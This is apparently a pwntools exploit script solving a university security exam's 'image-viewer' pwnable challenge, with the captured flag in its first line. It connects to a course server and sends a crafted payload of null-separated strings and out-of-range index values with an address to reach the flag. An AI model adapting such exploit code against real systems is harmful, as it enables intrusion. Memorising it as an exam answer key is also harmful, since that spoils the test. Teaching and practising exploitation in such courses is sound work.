# COMP6447{this_is_a_pic_of_me}
#!/usr/bin/env python
# UNSW COMP9447 18s2
# Exam Q1 - Pwnable
from pwn import *
import struct

#buf is 0x40 (64) long

# Exploit Variables
program = './image-viewer'
# host = 'exam.6447.sec.edu.au'
host = 'plzpwn.me'
port = 9997
elf = ELF(program)

# GOT addrs
printf_got = elf.got['printf']
puts_got = elf.got['puts']

# libc offsets

# search for gadgets
# libc = ELF('libc.so.6')
# gadget = lambda x : p32(libc.search(asm(x, arch=libc.arch)).next())

# Setup Connection
p = remote(host, port)
# p = process(program)
p.recvuntil('> ')
p.sendline('trivialexam' + '\x00' + 'flag' + '\x00'*8 + ('\xfc'+'\xff'*3+p32(0x804a06c))*3)
p.interactive()